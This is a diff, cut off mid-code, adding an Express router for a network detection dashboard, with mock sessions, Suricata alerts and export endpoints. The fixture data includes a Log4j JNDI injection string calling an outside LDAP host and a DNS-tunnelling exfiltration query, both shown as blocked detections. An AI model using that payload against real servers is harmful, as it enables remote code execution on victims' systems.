@@ -1,0 +1,1050 @@
+import { Router, Request, Response } from 'express';
+
+export interface TrafficSessionData {
+  id: number;
+  stream_id: string;
+  time: string;
+  src_ip: string;
+  src_port: number;
+  dst_ip: string;
+  dst_port: number;
+  proto: 'HTTPS' | 'HTTP' | 'DNS' | 'SSH' | 'SMB' | 'TLS' | 'PostgreSQL' | 'TCP' | 'UDP';
+  app_proto?: string;
+  bytes_in: string;
+  bytes_out: string;
+  total_bytes_num: number;
+  packets: number;
+  duration_ms: number;
+  threat_level?: 'Critical' | 'High' | 'Medium' | 'Low' | 'Clean';
+  threat_desc?: string;
+  action: 'Allowed' | 'Blocked' | 'Rate-limited' | 'Flagged';
+  geo_src?: { country: string; flag: string };
+  geo_dst?: { country: string; flag: string };
+  tcp_flags?: string;
+  ja3_hash?: string;
+  messages: Array<{
+    seq: number;
+    time_offset: string;
+    dir: 'out' | 'in';
+    msg_type: string;
+    payload_preview: string;
+    length: number;
+  }>;
+  hex_dump: Array<{
+    offset: string;
+    hex: string;
+    ascii: string;
+  }>;
+  decoded_summary?: {
+    protocol_stack: string[];
+    details: Record<string, string>;
+  };
+}
+
+export interface SuricataAlertData {
+  id: string;
+  timestamp: string;
+  sid: number;
+  rev: number;
+  signature: string;
+  category: string;
+  severity: 'Critical' | 'High' | 'Medium' | 'Low';
+  src_ip: string;
+  src_port: number;
+  dst_ip: string;
+  dst_port: number;
+  proto: string;
+  action: 'Blocked (Drop)' | 'Alerted' | 'Quarantined';
+  mitre_tactic: string;
+  mitre_technique: string;
+  cve?: string;
+  payload_snippet: string;
+}
+
+export function createNdrRouter() {
+  const router = Router();
+
+  // In-memory traffic control rules
+  let trafficControlRules = [
+    {
+      id: "tc-001",
+      name: "C2 異常 Beaconing 流量限速與隔離",
+      targetIp: "185.220.101.45",
+      action: "isolate" as "drop" | "limit" | "isolate" | "inspect",
+      rateLimitMbps: 0,
+      protocol: "ALL",
+      status: "active",
+      createdAt: new Date(Date.now() - 3600000).toISOString(),
+      matchedPackets: 18452,
+      description: "Suricata IDS 與 NDR 共同命中高頻固定週期的 C2 逆向連線，實施雙向硬阻斷。"
+    },
+    {
+      id: "tc-002",
+      name: "DNS 隧道高頻查詢抑制 (QoS)",
+      targetIp: "10.88.88.102",
+      action: "limit" as "drop" | "limit" | "isolate" | "inspect",
+      rateLimitMbps: 2,
+      protocol: "UDP 53",
+      status: "active",
+      createdAt: new Date(Date.now() - 7200000).toISOString(),
+      matchedPackets: 92841,
+      description: "對內網主機實施 DNS 頻寬塑形，防止利用子域名編碼進行大量資料外洩。"
+    },
+    {
+      id: "tc-003",
+      name: "外部惡意掃描來源阻絕",
+      targetIp: "198.51.100.89",
+      action: "drop" as "drop" | "limit" | "isolate" | "inspect",
+      rateLimitMbps: 0,
+      protocol: "TCP 80, 443",
+      status: "active",
+      createdAt: new Date(Date.now() - 14400000).toISOString(),
+      matchedPackets: 4210,
+      description: "針對荷蘭出口節點探測 Log4j JNDI Exploit 的惡意請求直接於邊界丟棄。"
+    }
+  ];
+
+  // In-memory live sessions dataset
+  let sessions: TrafficSessionData[] = [
+    {
+      id: 1,
+      stream_id: 'STR-994201',
+      time: '12:31:05',
+      src_ip: '10.88.88.106',
+      src_port: 51240,
+      dst_ip: '185.220.101.45',
+      dst_port: 443,
+      proto: 'HTTPS',
+      app_proto: 'TLS v1.3 (JA3: 771,4865-4866-4867,43-51-10,29-23)',
+      bytes_in: '12.4 KB',
+      bytes_out: '3.8 KB',
+      total_bytes_num: 16200,
+      packets: 48,
+      duration_ms: 320,
+      threat_level: 'Critical',
+      threat_desc: 'Lazarus APT Known C2 Encrypted Channel over TLS',
+      action: 'Blocked',
+      geo_src: { country: 'LAN (Corp)', flag: '🏢' },
+      geo_dst: { country: 'Russia (RU)', flag: '🇷🇺' },
+      tcp_flags: 'SYN, ACK, PSH, FIN',
+      ja3_hash: 'ada70206e40642a3e4461f35503241d5',
+      messages: [
+        { seq: 1, time_offset: '+0.000 ms', dir: 'out', msg_type: 'TCP SYN', payload_preview: '[SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256', length: 54 },
+        { seq: 2, time_offset: '+18.2 ms', dir: 'in', msg_type: 'TCP SYN-ACK', payload_preview: '[SYN, ACK] Seq=0 Ack=1 Win=65535 Len=0', length: 54 },
+        { seq: 3, time_offset: '+18.4 ms', dir: 'out', msg_type: 'TLS Client Hello', payload_preview: 'Handshake: Client Hello, TLS 1.3, SNI: "dark-c2-tunnel.onion.to"', length: 512 },
+        { seq: 4, time_offset: '+37.1 ms', dir: 'in', msg_type: 'TLS Server Hello', payload_preview: 'Handshake: Server Hello, Change Cipher Spec, Encrypted Extensions', length: 1420 },
+        { seq: 5, time_offset: '+42.0 ms', dir: 'out', msg_type: 'Application Data (Encrypted)', payload_preview: '[Encrypted C2 Beacon Heartbeat, IV=0x9f81a]', length: 256 }
+      ],
+      hex_dump: [
+        { offset: '0000', hex: '16 03 01 02 00 01 00 01 fc 03 03 a1 b2 c3 d4 e5 f6', ascii: '................' },
+        { offset: '0010', hex: '00 00 20 74 65 73 74 2d 63 32 2d 62 65 61 63 6f', ascii: '.. test-c2-beaco' },
+        { offset: '0020', hex: '6e 2e 6f 6e 69 6f 6e 2e 74 6f 00 2b 00 03 02 03', ascii: 'n.onion.to.+....' },
+        { offset: '0030', hex: '04 00 33 00 26 00 24 00 1d 00 20 9f 86 d0 81 88', ascii: '..3.&.$... .....' }
+      ],
+      decoded_summary: {
+        protocol_stack: ['Ethernet II', 'IPv4 (10.88.88.106 -> 185.220.101.45)', 'TCP (51240 -> 443)', 'TLSv1.3'],
+        details: {
+          'Server Name Indication (SNI)': 'dark-c2-tunnel.onion.to',
+          'Cipher Suite': 'TLS_AES_256_GCM_SHA384 (0x1302)',
+          'Supported Groups': 'x25519 (0x001d), secp256r1 (0x0017)',
+          'JA3 Fingerprint': 'ada70206e40642a3e4461f35503241d5',
+          'JA3S Fingerprint': 'ec74a5c5110605f9f8eac84b7252e1fb'
+        }
+      }
+    },
+    {
+      id: 2,
+      stream_id: 'STR-994202',
+      time: '12:30:48',
+      src_ip: '10.88.88.102',
+      src_port: 54102,
+      dst_ip: '8.8.8.8',
+      dst_port: 53,
+      proto: 'DNS',
+      app_proto: 'DNS over UDP (Base64 Tunneling)',
+      bytes_in: '1.4 KB',
+      bytes_out: '8.9 KB',
+      total_bytes_num: 10300,
+      packets: 24,
+      duration_ms: 110,
+      threat_level: 'High',
+      threat_desc: 'High Entropy DNS Data Exfiltration Tunnel',
+      action: 'Blocked',
+      geo_src: { country: 'LAN (Corp)', flag: '🏢' },
+      geo_dst: { country: 'United States (US)', flag: '🇺🇸' },
+      tcp_flags: 'N/A (UDP)',
+      messages: [
+        { seq: 1, time_offset: '+0.000 ms', dir: 'out', msg_type: 'DNS Query (TXT)', payload_preview: 'TXT dHNoYWRvd19wYXNzd29yZF9oYXNoX2V4Zmls.tunnel.ns.org', length: 120 },
+        { seq: 2, time_offset: '+12.4 ms', dir: 'in', msg_type: 'DNS Response', payload_preview: 'TXT "ACK_CHUNK_01_OK"', length: 90 }
+      ],
+      hex_dump: [
+        { offset: '0000', hex: 'a1 b2 01 00 00 01 00 00 00 00 00 00 24 64 54 4e', ascii: '............$dTN' },
+        { offset: '0010', hex: '6f 59 57 52 76 64 31 39 77 59 58 4e 7a 64 32 39', ascii: 'oYWRvd19wYXNzd29' },
+        { offset: '0020', hex: '79 5a 46 39 6f 59 58 4e 6f 06 74 75 6e 6e 65 6c', ascii: 'yZF9oYXNo.tunnel' }
+      ],
+      decoded_summary: {
+        protocol_stack: ['Ethernet II', 'IPv4 (10.88.88.102 -> 8.8.8.8)', 'UDP (54102 -> 53)', 'DNS Query'],
+        details: {
+          'Query Record Type': 'TXT (Text Record)',
+          'Query Domain': 'dHNoYWRvd19wYXNzd29yZF9oYXNoX2V4Zmls.tunnel.ns.org',
+          'Payload Entropy': '4.89 (Abnormally High Entropy)',
+          'Decoded String': 'tshadow_password_hash_exfil'
+        }
+      }
+    },
+    {
+      id: 3,
+      stream_id: 'STR-994203',
+      time: '12:29:15',
+      src_ip: '198.51.100.89',
+      src_port: 48911,
+      dst_ip: '10.88.88.201',
+      dst_port: 80,
+      proto: 'HTTP',
+      app_proto: 'HTTP/1.1 (Log4j JNDI Injection)',
+      bytes_in: '420 B',
+      bytes_out: '1.8 KB',
+      total_bytes_num: 2220,
+      packets: 12,
+      duration_ms: 85,
+      threat_level: 'Critical',
+      threat_desc: 'CVE-2021-44228 Apache Log4j JNDI RCE Exploit in User-Agent',
+      action: 'Blocked',
+      geo_src: { country: 'Netherlands (NL)', flag: '🇳🇱' },
+      geo_dst: { country: 'DMZ Server', flag: '🛡️' },
+      tcp_flags: 'SYN, ACK, PSH',
+      messages: [
+        { seq: 1, time_offset: '+0.000 ms', dir: 'out', msg_type: 'HTTP GET Request', payload_preview: 'GET /login HTTP/1.1, User-Agent: ${jndi:ldap://198.51.100.89:1389/Exploit}', length: 280 },
+        { seq: 2, time_offset: '+1.2 ms', dir: 'in', msg_type: 'HTTP 403 Forbidden', payload_preview: 'HTTP/1.1 403 Forbidden (Blocked by WAF/Suricata)', length: 180 }
+      ],
+      hex_dump: [
+        { offset: '0000', hex: '47 45 54 20 2f 6c 6f 67 69 6e 20 48 54 54 50 2f', ascii: 'GET /login HTTP/' },
+        { offset: '0010', hex: '31 2e 31 0d 0a 55 73 65 72 2d 41 67 65 6e 74 3a', ascii: '1.1..User-Agent:' },
+        { offset: '0020', hex: '20 24 7b 6a 6e 64 69 3a 6c 64 61 70 3a 2f 2f 31', ascii: ' ${jndi:ldap://1' },
+        { offset: '0030', hex: '39 38 2e 35 31 2e 31 30 30 2e 38 39 3a 31 33 38', ascii: '98.51.100.89:138' }
+      ],
+      decoded_summary: {
+        protocol_stack: ['Ethernet II', 'IPv4 (198.51.100.89 -> 10.88.88.201)', 'TCP (48911 -> 80)', 'HTTP/1.1'],
+        details: {
+          'HTTP Method': 'GET',
+          'Request URI': '/login',
+          'Exploit Header': 'User-Agent: ${jndi:ldap://198.51.100.89:1389/Exploit}',
+          'Target Vulnerability': 'Apache Log4j2 JNDI Remote Code Execution (CVE-2021-44228)'
+        }
+      }
+    },
+    {
+      id: 4,
+      stream_id: 'STR-994204',
+      time: '12:27:30',
+      src_ip: '10.88.88.202',
+      src_port: 58912,
+      dst_ip: '10.88.88.200',
+      dst_port: 5432,
+      proto: 'PostgreSQL',
+      app_proto: 'PostgreSQL Backend Protocol v3.0',
+      bytes_in: '45.2 MB',
+      bytes_out: '120.4 MB',
+      total_bytes_num: 165600000,
+      packets: 12400,
+      duration_ms: 4500,
+      threat_level: 'Clean',
+      threat_desc: 'Normal Database Replication Cluster Synchronization',
+      action: 'Allowed',
+      geo_src: { country: 'Server Farm', flag: '🏢' },
+      geo_dst: { country: 'Database Master', flag: '🗄️' },
+      tcp_flags: 'ACK, PSH',
+      messages: [
+        { seq: 1, time_offset: '+0.000 ms', dir: 'out', msg_type: 'StartupMessage', payload_preview: 'protocol_version=3.0, user=repl_user, database=postgres', length: 128 },
+        { seq: 2, time_offset: '+0.8 ms', dir: 'in', msg_type: 'AuthenticationOk', payload_preview: 'Auth Type: SCRAM-SHA-256 Passed', length: 64 },
+        { seq: 3, time_offset: '+1.5 ms', dir: 'out', msg_type: 'START_REPLICATION', payload_preview: 'START_REPLICATION SLOT "slot_node2" LOGICAL 0/1600000', length: 96 }
+      ],
+      hex_dump: [
+        { offset: '0000', hex: '00 00 00 54 00 03 00 00 75 73 65 72 00 72 65 70', ascii: '...T....user.rep' },
+        { offset: '0010', hex: '6c 5f 75 73 65 72 00 64 61 74 61 62 61 73 65 00', ascii: 'l_user.database.' },
+        { offset: '0020', hex: '70 6f 73 74 67 72 65 73 00 00 00 00 00 00 00 00', ascii: 'postgres........' }
+      ],
+      decoded_summary: {
+        protocol_stack: ['Ethernet II', 'IPv4 (10.88.88.202 -> 10.88.88.200)', 'TCP (58912 -> 5432)', 'PostgreSQL v3.0'],
+        details: {
+          'Database User': 'repl_user',
+          'Database Name': 'postgres',
+          'Replication Slot': 'slot_node2',
+          'Stream Status': 'STREAMING_SYNCHRONIZED'
+        }
+      }
+    },
+    {
+      id: 5,
+      stream_id: 'STR-994205',
+      time: '12:25:10',
+      src_ip: '172.16.0.50',
+      src_port: 42100,
+      dst_ip: '10.88.88.254',
+      dst_port: 22,
+      proto: 'SSH',
+      app_proto: 'SSH-2.0-OpenSSH_8.9',
+      bytes_in: '18.4 KB',
+      bytes_out: '12.1 KB',
+      total_bytes_num: 30500,
+      packets: 142,
+      duration_ms: 12000,
+      threat_level: 'Medium',
+      threat_desc: 'Multiple SSH Failed Auth Attempts (Brute Force Pattern)',
+      action: 'Rate-limited',
+      geo_src: { country: 'Guest WiFi DMZ', flag: '📶' },
+      geo_dst: { country: 'Core Switch', flag: '🔀' },
+      tcp_flags: 'SYN, ACK, PSH',
+      messages: [
+        { seq: 1, time_offset: '+0.000 ms', dir: 'out', msg_type: 'SSH Protocol Init', payload_preview: 'SSH-2.0-libssh2_1.10.0', length: 32 },
+        { seq: 2, time_offset: '+1.1 ms', dir: 'in', msg_type: 'SSH Protocol Resp', payload_preview: 'SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6', length: 42 },
+        { seq: 3, time_offset: '+4.5 ms', dir: 'out', msg_type: 'Key Exchange Init', payload_preview: 'KEX: curve25519-sha256, HostKey: rsa-sha2-512', length: 820 },
+        { seq: 4, time_offset: '+15.2 ms', dir: 'out', msg_type: 'SSH UserAuth Request', payload_preview: 'UserAuth: root (password: *******)', length: 64 },
+        { seq: 5, time_offset: '+18.0 ms', dir: 'in', msg_type: 'SSH UserAuth Failure', payload_preview: 'Auth Failed: Partial=0, Allowed=publickey,password', length: 48 }
+      ],
+      hex_dump: [
+        { offset: '0000', hex: '53 53 48 2d 32 2e 30 2d 6c 69 62 73 73 68 32 5f', ascii: 'SSH-2.0-libssh2_' },
+        { offset: '0010', hex: '31 2e 31 30 2e 30 0d 0a 00 00 03 34 0a 14 9f 88', ascii: '1.10.0.....4....' },
+        { offset: '0020', hex: '22 a1 84 f5 d9 81 e2 00 00 00 2c 63 75 72 76 65', ascii: '".........,curve' }
+      ],
+      decoded_summary: {
+        protocol_stack: ['Ethernet II', 'IPv4 (172.16.0.50 -> 10.88.88.254)', 'TCP (42100 -> 22)', 'SSH-2.0'],
+        details: {
+          'Client Identification': 'SSH-2.0-libssh2_1.10.0',
+          'Target User': 'root',
+          'Authentication Method': 'Password',
+          'Result': 'Authentication Failure (Rate limit enforced)'
+        }
+      }
+    }
+  ];
+
+  // In-memory Suricata alerts dataset
+  let suricataAlerts: SuricataAlertData[] = [
+    {
+      id: 'SUR-881',
+      timestamp: '12:31:05',
+      sid: 2029941,
+      rev: 4,
+      signature: 'ET TROJAN Lazarus APT TLS C2 Beaconing Activity',
+      category: 'A Network Trojan was detected',
+      severity: 'Critical',
+      src_ip: '10.88.88.106',
+      src_port: 51240,
+      dst_ip: '185.220.101.45',
+      dst_port: 443,
+      proto: 'TCP',
+      action: 'Blocked (Drop)',
+      mitre_tactic: 'Command and Control',
+      mitre_technique: 'T1071.001 Web Protocols',
+      payload_snippet: 'dark-c2-tunnel.onion.to | JA3: ada70206e40642a3e4461f35503241d5'
+    },
+    {
+      id: 'SUR-882',
+      timestamp: '12:29:15',
+      sid: 2034647,
+      rev: 1,
+      signature: 'ET EXPLOIT Possible Apache Log4j RCE (CVE-2021-44228) in User-Agent Header',
+      category: 'Attempted User Privilege Gain',
+      severity: 'Critical',
+      src_ip: '198.51.100.89',
+      src_port: 48911,
+      dst_ip: '10.88.88.201',
+      dst_port: 80,
+      proto: 'TCP',
+      action: 'Blocked (Drop)',
+      mitre_tactic: 'Initial Access',
+      mitre_technique: 'T1190 Exploit Public-Facing Application',
+      cve: 'CVE-2021-44228',
+      payload_snippet: 'User-Agent: ${jndi:ldap://198.51.100.89:1389/Exploit}'
+    },
+    {
+      id: 'SUR-883',
+      timestamp: '12:30:48',
+      sid: 2018240,
+      rev: 2,
+      signature: 'ET INFO High-Entropy Base64 Encoded DNS Tunneling Exfiltration',
+      category: 'Information Leak',
+      severity: 'High',
+      src_ip: '10.88.88.102',
+      src_port: 54102,
+      dst_ip: '8.8.8.8',
+      dst_port: 53,
+      proto: 'UDP',
+      action: 'Blocked (Drop)',
+      mitre_tactic: 'Exfiltration',
+      mitre_technique: 'T1048.003 Exfiltration Over Alternative Protocol',
+      payload_snippet: 'TXT: dHNoYWRvd19wYXNzd29yZF9oYXNoX2V4Zmls.tunnel.ns.org'
+    },
+    {
+      id: 'SUR-884',
+      timestamp: '12:25:10',
+      sid: 2001219,
+      rev: 18,
+      signature: 'ET SCAN Potential SSH Brute Force Inbound Connection Attempt',
+      category: 'Attempted Information Leak',
+      severity: 'Medium',
+      src_ip: '172.16.0.50',
+      src_port: 42100,
+      dst_ip: '10.88.88.254',
+      dst_port: 22,
+      proto: 'TCP',
+      action: 'Alerted',
+      mitre_tactic: 'Credential Access',
+      mitre_technique: 'T1110.001 Password Guessing',
+      payload_snippet: 'SSH UserAuth request user="root" count=15/minute'
+    }
+  ];
+
+  // Capture engine state
+  let captureState = {
+    running: true,
+    speedMs: 3000,
+    afPacketRingBuffer: 'Active (Zero-Copy 4GB)',
+    interface: 'eth0 (Mirror-Tap0)',
+    zeroDrop: true,
+    lastRefreshedAt: new Date().toISOString()
+  };
+
+  // Suricata engine state
+  let suricataState = {
+    version: 'Suricata 7.0.4 RELEASE',
+    activeRules: 68419,
+    lastSyncTime: new Date(Date.now() - 7200000).toISOString(),
+    workerThreads: 16,
+    hyperscanJIT: true,
+    ipsInlineMode: true,
+    packetDropRatePct: 0.00,
+    zeekAnalyzers: {
+      tlsLogs: 45210,
+      dnsQueries: 18400,
+      httpStreams: 8920,
+      smbAudits: 3410
+    }
+  };
+
+  // 1. NDR Real-time Telemetry Overview
+  router.get('/telemetry', (req: Request, res: Response) => {
+    const now = Date.now();
+    const throughputMbps = Number((1850 + Math.sin(now / 5000) * 120 + Math.random() * 30).toFixed(1));
+    const pps = Number((1.24 + Math.sin(now / 7000) * 0.08).toFixed(2));
+    const eps = Math.floor(940000 + Math.sin(now / 4000) * 25000);
+    const activeSessionsCount = 58420 + Math.floor(Math.sin(now / 10000) * 450);
+
+    const criticalAlertsCount = suricataAlerts.filter(a => a.severity === 'Critical').length;
+    const totalAlertsCount = suricataAlerts.length;
+
+    res.json({
+      success: true,
+      timestamp: new Date().toISOString(),
+      captureState,
+      throughput: {
+        currentMbps: throughputMbps,
+        currentGbps: Number((throughputMbps / 1000).toFixed(2)),
+        peakMbps: 2420.0,
+        currentPps: `${pps}M pps`,
+        currentEps: `${(eps / 1000).toFixed(0)}k EPS`,
+        activeFlows: activeSessionsCount,
+        tcpRetransmitRatePct: Number((0.18 + Math.random() * 0.05).toFixed(2)),
+        zeroWindowDrops: 0,
+        aggregationLoadPct: 4.6
+      },
+      storage: {
+        usedTB: 14.2,
+        totalTB: 20.0,
+        usagePct: 71,
+        retentionDays: 45
+      },
+      alertsSummary: {
+        total: totalAlertsCount,
+        critical: criticalAlertsCount,
+        high: suricataAlerts.filter(a => a.severity === 'High').length,
+        medium: suricataAlerts.filter(a => a.severity === 'Medium').length
+      },
+      protocols: [
+        { name: "TLS 1.3 / HTTPS", percentage: 54.2, mbps: Number((throughputMbps * 0.542).toFixed(1)), color: "#06b6d4" },
+        { name: "QUIC / HTTP3", percentage: 18.5, mbps: Number((throughputMbps * 0.185).toFixed(1)), color: "#6366f1" },
+        { name: "DNS (UDP 53 / DoT)", percentage: 11.4, mbps: Number((throughputMbps * 0.114).toFixed(1)), color: "#a855f7" },
+        { name: "SMBv3 / RPC", percentage: 8.9, mbps: Number((throughputMbps * 0.089).toFixed(1)), color: "#ec4899" },
+        { name: "SSH (TCP 22)", percentage: 4.1, mbps: Number((throughputMbps * 0.041).toFixed(1)), color: "#f59e0b" },
+        { name: "Other (ICMP / SNMP)", percentage: 2.9, mbps: Number((throughputMbps * 0.029).toFixed(1)), color: "#10b981" }
+      ]
+    });
+  });
+
+  // 2. Query / Filter Captured Sessions (BPF / Wireshark search & pagination)
+  router.get('/sessions', (req: Request, res: Response) => {
+    const { query, proto, threat_level, limit, offset } = req.query;
+
+    let filtered = [...sessions];
+
+    if (proto && proto !== 'ALL') {
+      filtered = filtered.filter(s => s.proto.toLowerCase() === String(proto).toLowerCase());
+    }
+
+    if (threat_level && threat_level !== 'ALL') {
+      filtered = filtered.filter(s => s.threat_level?.toLowerCase() === String(threat_level).toLowerCase());
+    }
+
+    if (query && typeof query === 'string' && query.trim()) {
+      const q = query.trim().toLowerCase();
+      // Handle simple BPF terms like 'ip.addr == ...' or plain substring search
+      filtered = filtered.filter(s => {
+        const rawString = `${s.src_ip} ${s.src_port} ${s.dst_ip} ${s.dst_port} ${s.proto} ${s.app_proto || ''} ${s.stream_id} ${s.threat_desc || ''}`.toLowerCase();
+        
+        // Exact IP or substring match
+        if (rawString.includes(q)) return true;
+
+        // Wireshark BPF syntax token checks
+        if (q.includes('ip.addr') || q.includes('ip.src') || q.includes('ip.dst')) {
+          const matchIp = q.match(/\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b/);
+          if (matchIp && (s.src_ip.includes(matchIp[0]) || s.dst_ip.includes(matchIp[0]))) return true;
+        }
+
+        if (q.includes('tcp.port') || q.includes('udp.port') || q.includes('port')) {
+          const matchPort = q.match(/\b\d{2,5}\b/);
+          if (matchPort && (String(s.src_port) === matchPort[0] || String(s.dst_port) === matchPort[0])) return true;
+        }
+
+        return false;
+      });
+    }
+
+    const total = filtered.length;
+    const offsetNum = Number(offset) || 0;
+    const limitNum = Number(limit) || 100;
+    const paginated = filtered.slice(offsetNum, offsetNum + limitNum);
+
+    res.json({
+      success: true,
+      total,
+      count: paginated.length,
+      offset: offsetNum,
+      limit: limitNum,
+      sessions: paginated
+    });
+  });
+
+  // 2.1 Export Filtered Sessions as CSV or PCAP
+  router.get('/export', (req: Request, res: Response) => {
+    const { format = 'csv', query, proto, threat_level, ids, filename } = req.query;
+
+    let targetSessions = [...sessions];
+
+    if (ids && typeof ids === 'string') {
+      const idList = ids.split(',').map(s => Number(s.trim())).filter(n => !isNaN(n));
+      if (idList.length > 0) {
+        targetSessions = targetSessions.filter(s => idList.includes(s.id));
+      }
+    }
+
+    if (proto && proto !== 'ALL') {
+      targetSessions = targetSessions.filter(s => s.proto.toLowerCase() === String(proto).toLowerCase());
+    }
+
+    if (threat_level && threat_level !== 'ALL') {
+      targetSessions = targetSessions.filter(s => s.threat_level?.toLowerCase() === String(threat_level).toLowerCase());
+    }
+
+    if (query && typeof query === 'string' && query.trim()) {
+      const q = query.trim().toLowerCase();
+      targetSessions = targetSessions.filter(s => {
+        const rawString = `${s.src_ip} ${s.src_port} ${s.dst_ip} ${s.dst_port} ${s.proto} ${s.app_proto || ''} ${s.stream_id} ${s.threat_desc || ''}`.toLowerCase();
+        if (rawString.includes(q)) return true;
+        if (q.includes('ip.addr') || q.includes('ip.src') || q.includes('ip.dst')) {
+          const matchIp = q.match(/\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b/);
+          if (matchIp && (s.src_ip.includes(matchIp[0]) || s.dst_ip.includes(matchIp[0]))) return true;
+        }
+        if (q.includes('tcp.port') || q.includes('udp.port') || q.includes('port')) {
+          const matchPort = q.match(/\b\d{2,5}\b/);
+          if (matchPort && (String(s.src_port) === matchPort[0] || String(s.dst_port) === matchPort[0])) return true;
+        }
+        return false;
+      });
+    }
+
+    const timestamp = new Date().toISOString().replace(/[-:T]/g, '').slice(0, 14);
+
+    if (format === 'csv') {
+      const headers = [
+        'Session_ID',
+        'Stream_ID',
+        'Timestamp',
+        'Source_IP',
+        'Source_Port',
+        'Destination_IP',
+        'Destination_Port',
+        'Transport_Protocol',
+        'Application_Protocol',
+        'TCP_Flags',
+        'JA3_Fingerprint',
+        'Bytes_In',
+        'Bytes_Out',
+        'Total_Bytes_Num',
+        'Packets_Count',
+        'Duration_ms',
+        'Threat_Level',
+        'Threat_Description',
+        'Enforcement_Action',
+        'Source_Country',
+        'Destination_Country',
+        'Messages_Count',
+        'Payload_Synopsis'
+      ];
+
+      const escapeCsv = (val: any): string => {
+        if (val === null || val === undefined) return '';
+        const str = String(val);
+        if (str.includes(',') || str.includes('"') || str.includes('\n') || str.includes('\r')) {
+          return `"${str.replace(/"/g, '""')}"`;
+        }
+        return str;
+      };
+
+      const rows = targetSessions.map(s => {
+        let payloadSynopsis = '';
+        if (s.messages && Array.isArray(s.messages) && s.messages.length > 0) {
+          payloadSynopsis = s.messages
+            .map((m: any) => `[${m.dir === 'out' ? 'OUT' : 'IN'}:${m.msg_type || 'DATA'}] ${m.payload_preview || ''}`)
+            .join(' | ');
+        } else if (s.decoded_summary?.protocol_stack) {
+          payloadSynopsis = `Stack: ${s.decoded_summary.protocol_stack.join(' > ')}`;
+        } else if (s.hex_dump && Array.isArray(s.hex_dump) && s.hex_dump.length > 0) {
+          payloadSynopsis = s.hex_dump.map((h: any) => h.ascii || '').filter(Boolean).join(' ');
+        }
+
+        const geoSrc = s.geo_src ? `${s.geo_src.country || ''} ${s.geo_src.flag || ''}`.trim() : '';
+        const geoDst = s.geo_dst ? `${s.geo_dst.country || ''} ${s.geo_dst.flag || ''}`.trim() : '';
+        const msgCount = s.messages && Array.isArray(s.messages) ? s.messages.length : (s.packets || 0);
+
+        return [
+          escapeCsv(s.id),
+          escapeCsv(s.stream_id),
+          escapeCsv(s.time || ''),
+          escapeCsv(s.src_ip),
+          escapeCsv(s.src_port),
+          escapeCsv(s.dst_ip),
+          escapeCsv(s.dst_port),
+          escapeCsv(s.proto),
+          escapeCsv(s.app_proto || s.proto),
+          escapeCsv(s.tcp_flags || ''),
+          escapeCsv((s as any).ja3_hash || ''),
+          escapeCsv(s.bytes_in || '0 B'),
+          escapeCsv(s.bytes_out || '0 B'),
+          escapeCsv(s.total_bytes_num || 0),
+          escapeCsv(s.packets || 0),
+          escapeCsv(s.duration_ms || 0),
+          escapeCsv(s.threat_level || 'Clean'),
+          escapeCsv(s.threat_desc || 'Normal Traffic'),
+          escapeCsv(s.action || 'Allowed'),
+          escapeCsv(geoSrc),
+          escapeCsv(geoDst),
+          escapeCsv(msgCount),
+          escapeCsv(payloadSynopsis)
+        ].join(',');
+      });
+
+      const csvContent = '\uFEFF' + [headers.join(','), ...rows].join('\r\n');
+      const exportName = filename && typeof filename === 'string'
+        ? (filename.endsWith('.csv') ? filename : `${filename}.csv`)
+        : `semor_flows_${targetSessions.length}sessions_${timestamp}.csv`;
+
+      res.setHeader('Content-Type', 'text/csv; charset=utf-8');
+      res.setHeader('Content-Disposition', `attachment; filename="${exportName}"`);
+      return res.send(csvContent);
+    }
+
+    // Default to PCAP binary export
+    const exportName = filename && typeof filename === 'string'
+      ? (filename.endsWith('.pcap') ? filename : `${filename}.pcap`)
+      : `semor_capture_${targetSessions.length}sessions_${timestamp}.pcap`;
+
+    const pcapHeader = Buffer.alloc(24);
+    pcapHeader.writeUInt32LE(0xa1b2c3d4, 0); // Magic Number (microsecond resolution)
+    pcapHeader.writeUInt16LE(2, 4);          // Major Version
+    pcapHeader.writeUInt16LE(4, 6);          // Minor Version
+    pcapHeader.writeInt32LE(0, 8);           // Thiszone (GMT)
+    pcapHeader.writeUInt32LE(0, 12);         // Sigfigs
+    pcapHeader.writeUInt32LE(65535, 16);     // Snaplen
+    pcapHeader.writeUInt32LE(1, 20);         // LinkType: 1 (Ethernet)
+
+    const packetBuffers: Buffer[] = [pcapHeader];
+    const baseTime = Math.floor(Date.now() / 1000) - (targetSessions.length * 30);
+
+    targetSessions.forEach((s, idx) => {
+      const pktTime = baseTime + (idx * 15);
+      const isUdp = s.proto === 'DNS' || s.proto === 'UDP';
+      const ipProto = isUdp ? 17 : 6;
+
+      const parseIp = (ipStr: string) => {
+        const parts = ipStr.split('.').map(n => parseInt(n.trim(), 10));
+        return (parts.length === 4 && parts.every(n => !isNaN(n))) ? parts : [10, 0, 0, 1];
+      };
+      const srcBytes = parseIp(s.src_ip);
+      const dstBytes = parseIp(s.dst_ip);
+
+      const payloadStr = s.messages && s.messages.length > 0
+        ? s.messages[0].payload_preview || `DATA ${s.proto}`
+        : `${s.proto} stream ${s.stream_id}`;
+      const payloadBuf = Buffer.from(payloadStr);
+
+      const l4Len = isUdp ? 8 : 20;
+      const ipLen = 20 + l4Len + payloadBuf.length;
+      const frameLen = 14 + ipLen;
+
+      const recHeader = Buffer.alloc(16);
+      recHeader.writeUInt32LE(pktTime, 0);
+      recHeader.writeUInt32LE(123456, 4);
+      recHeader.writeUInt32LE(frameLen, 8);
+      recHeader.writeUInt32LE(frameLen, 12);
+
+      const ethHeader = Buffer.alloc(14);
+      ethHeader.set([0x00, 0x50, 0x56, 0xc0, 0x00, 0x01], 0);
+      ethHeader.set([0x00, 0x0c, 0x29, 0x88, 0x77, 0x66], 6);
+      ethHeader.writeUInt16BE(0x0800, 12);
+
+      const ipHeader = Buffer.alloc(20);
+      ipHeader[0] = 0x45;
+      ipHeader[1] = 0x00;
+      ipHeader.writeUInt16BE(ipLen, 2);
+      ipHeader.writeUInt16BE(1000 + idx, 4);
+      ipHeader.writeUInt16BE(0x4000, 6);
+      ipHeader[8] = 64;
+      ipHeader[9] = ipProto;
+      ipHeader.set(srcBytes, 12);
+      ipHeader.set(dstBytes, 16);
+
+      const l4Header = Buffer.alloc(l4Len);
+      l4Header.writeUInt16BE(s.src_port, 0);
+      l4Header.writeUInt16BE(s.dst_port, 2);
+      if (isUdp) {
